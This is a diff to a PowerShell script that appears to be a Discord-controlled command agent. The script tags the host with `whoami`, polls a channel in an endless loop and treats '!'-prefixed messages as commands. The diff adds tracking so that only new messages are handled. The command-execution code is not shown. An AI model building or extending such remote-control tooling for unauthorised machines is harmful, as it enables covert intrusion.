@@ -14,6 +14,9 @@ $client.DefaultRequestHeaders.Accept.Add("application/json")
 # Get the current machine identity using `whoami`
 $global:machineName = whoami
 
+# Variable to store the latest message ID processed
+$global:lastMessageId = $null
+
 # Function to send a message to Discord
 function Send-DiscordMessage {
     param (
@@ -95,13 +98,38 @@ function Get-DiscordMessages {
     }
 }
 
+# Function to filter out old messages and only process new ones
+function Filter-NewMessages {
+    param (
+        [array]$messages
+    )
+
+    $newMessages = @()
+    foreach ($message in $messages) {
+        # If there is no last processed message ID, set it to the first one we encounter
+        if (-not $global:lastMessageId) {
+            $global:lastMessageId = $message.id
+            continue
+        }
+
+        # Only add messages that are more recent than the last processed one
+        if ($message.id -gt $global:lastMessageId) {
+            $newMessages += $message
+            $global:lastMessageId = $message.id  # Update last processed message ID
+        }
+    }
+    return $newMessages
+}
+
 # Main loop with rate limiting and command filtering
 while ($true) {
     $messages = Get-DiscordMessages
 
     if ($messages) {
-        foreach ($message in $messages) {
-            # Process only if it's a new message and it's not sent by the bot itself
+        $newMessages = Filter-NewMessages -messages $messages
+
+        foreach ($message in $newMessages) {
+            # Process only if it's not sent by the bot itself
             if ($message.author.id -ne $botUserId) {
                 if ($message.content.StartsWith("!")) {
                     $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
